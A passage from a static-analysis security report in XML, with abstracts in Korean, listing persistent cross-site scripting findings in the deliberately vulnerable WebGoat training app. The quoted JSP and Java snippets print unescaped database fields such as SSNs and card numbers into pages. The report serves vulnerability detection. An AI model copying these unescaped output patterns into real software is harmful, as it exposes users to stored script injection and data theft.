                            <Friority>Critical</Friority>
                            <Primary>
<FileName>CSRF.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CSRF.java</FilePath>
<LineStart>253</LineStart>
<Snippet>				String messageData = results.getString( MESSAGE_COL );
				TR row2 = new TR( new TD( new B(new StringElement( "Message:" )) ) );
				row2.addElement( new TD( new StringElement( messageData ) ) );
				t.addElement( row2 );
											</Snippet>
<TargetFunction>org.apache.ecs.html.TD.TD()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>CSRF.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CSRF.java</FilePath>
<LineStart>241</LineStart>
<Snippet>			statement.setString(1, getNameroot( s.getUserName() ) + "%");
			statement.setInt(2, messageNum);
			ResultSet results = statement.executeQuery();

			if ( ( results != null ) &amp;&amp; results.first() )</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="17BAD97F7283A1E09A7332F8765E3A10" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 54 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;span class="lesson_text_db"&gt;&lt;%=employee.getSsn()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3A8E3BB2450E531B99FA728F81DEA041" ruleID="94B3FB0E-4AED-4006-9CDD-B2B1C13747EE">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>StoredXss.java의 makeCurrent() 메서드가 233 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>StoredXss.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/StoredXss.java</FilePath>
<LineStart>233</LineStart>
<Snippet>			.setBorder(0);
		TR row1 = new TR(new TD(new B(new StringElement("Title:"))));
		row1.addElement(new TD(new StringElement(results
			.getString(TITLE_COL))));
		t.addElement(row1);</Snippet>
<TargetFunction>org.apache.ecs.html.TD.TD()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>StoredXss.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/StoredXss.java</FilePath>
<LineStart>224</LineStart>
<Snippet>	    statement.setString(1, getNameroot(s.getUserName()) + "%");
	    statement.setInt(2, messageNum);
	    ResultSet results = statement.executeQuery();

	    if ((results != null) &amp;&amp; results.first())</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="20D4717D234AB7DFC362C607FD1829C8" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 28 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>28</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.ADDRESS1%&gt;" type="text" value="&lt;%=employee.getAddress1()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="AB79656A66CEF9E653D878D1A98A0DB6" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 8 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ListStaff.jsp</FilePath>
<LineStart>8</LineStart>
<Snippet>	int myUserId = webSession.getUserIdInLesson();
%&gt;
	&lt;div class="lesson_title_box"&gt;&lt;strong&gt;Welcome Back &lt;/strong&gt;&lt;span class="lesson_text_db"&gt;&lt;%=webSession.getUserNameInLesson()%&gt;&lt;/span&gt; - Staff Listing Page&lt;/div&gt;
		&lt;br&gt;
		&lt;br&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>203</LineStart>
<Snippet>			{
				Statement answer_statement = WebSession.getConnection(s).createStatement( ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
				ResultSet answer_results = answer_statement.executeQuery( query );
				if (answer_results.next())
					name = answer_results.getString("first_name");</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="05C6D1A3F672BE593B2AF5B468BBD438" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 29 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>29</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getAddress1()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="EE33178DA71DFA2D284BDB8763A1A955" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="97E77DF19D546124314DD757EBBF099E" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 67 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6A8E6B606C67035E4B427D9F06D16FE9" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 123 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>123</LineStart>
<Snippet>                       	&lt;td width="81"&gt;
 							&lt;input name="&lt;%=CrossSiteScripting.EMPLOYEE_ID%&gt;" type="hidden" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input name="&lt;%=CrossSiteScripting.TITLE%&gt;" type="hidden" value="&lt;%=employee.getTitle()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=CrossSiteScripting.UPDATEPROFILE_ACTION%&gt;"/&gt;
						&lt;/td&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E491F5B02EE4F95A556C755D128185C3" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>194</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="532ABCA8C67D25E6DAC5720E68D03C79" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 47 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>47</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getStartDate()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="20CDC6ABE4555D38D81B4924734BAA0A" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 41 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>41</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getPhoneNumber()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6C273B3B1D033D8E09ADC72306B1B126" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getFirstName()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BD1957ED6BE0E0DFA0BA14A88F090492" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 18 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>18</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getFirstName()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="56F5463EBA0EF21C36211510678312BA" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 94 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>94</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E8E22010527A28BDB97466BD10D7A4E9" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 94 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>94</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6A457B59C2EA6AD7C9F0FC6DDBF6275E" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 45 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>45</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getPhoneNumber()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3AE6A2FD8F0A2D4ECF088D8AA38777CD" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 103 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>103</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;textarea name="&lt;%=CrossSiteScripting.DISCIPLINARY_NOTES%&gt;" cols="16" rows="3" class="lesson_text_db" &gt;&lt;%=employee.getDisciplinaryActionNotes()%&gt;&lt;/textarea&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="308ACD032FC92ACAC4193A9D1BCC62C8" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 41 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>41</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getPhoneNumber()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BC53B55D3B8C0455C062C2E7C5003DC8" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 47 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>47</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getStartDate()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
